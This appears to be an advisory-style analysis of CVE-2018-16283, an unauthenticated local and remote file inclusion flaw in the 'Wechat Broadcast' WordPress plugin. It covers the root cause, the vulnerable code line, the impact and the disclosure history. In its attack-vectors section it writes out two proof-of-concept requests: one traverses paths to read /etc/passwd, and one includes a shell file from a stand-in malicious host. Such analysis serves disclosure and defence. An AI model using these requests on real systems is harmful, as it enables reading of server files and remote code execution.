Based on the provided information, here's an analysis of CVE-2018-16283:

**Root cause of vulnerability:**

- The vulnerability stems from a lack of sanitization of the `url` parameter in the `Image.php` file of the "Wechat Broadcast" WordPress plugin. This allows an attacker to include arbitrary local or remote files due to the usage of `file_get_contents()` without proper input validation.

**Weaknesses/vulnerabilities present:**

- **Local File Inclusion (LFI):** The ability to read local files from the server.
- **Remote File Inclusion (RFI):** The ability to include and execute remote files on the server.

**Impact of exploitation:**

- **Public Defacement:** An attacker could alter the content of the website.
- **Confidential Data Leakage:** Sensitive information stored on the server could be accessed (e.g., `/etc/passwd`).
- **Database Server Compromise:** Potentially lead to compromising the database server due to leaked credentials or further exploitation.
- **Client System Compromise:**  By injecting malicious code, attackers could potentially compromise clients visiting the site.
- **Complete System Compromise:** Exploitation can lead to the compromise of both client and server systems.

**Attack vectors:**

- The vulnerability is exploited via an HTTP GET request to the `Image.php` file, supplying the malicious URL in the `url` parameter.
- Local File Inclusion: `GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd`
- Remote File Inclusion: `GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=http://malicious.url/shell.txt`

**Required attacker capabilities/position:**

- The attacker does not need to be authenticated.
- The attacker only needs to send an HTTP request to the vulnerable endpoint.
- The attacker needs to be able to send an HTTP request to the vulnerable server.

**Additional Details:**

- The vulnerability is present in the `wechat-broadcast/wechat/Image.php` file.
- The vulnerable code snippet is: `echo file_get_contents(isset($_GET["url"]) ? $_GET["url"] : '');`
- The plugin version affected is 1.2.0 and earlier.
- The plugin was closed on October 7, 2018, due to this security issue.
- The vulnerability was discovered by Manuel Garcia Cardenas.
- The vendor was contacted multiple times without response.

The provided information includes a Proof of Concept (POC) for both local and remote file inclusion. It also mentions that using HTTP protocol version 1.0 might be needed to interact with the application during exploitation, however this is not elaborated on and its relevance is unclear.
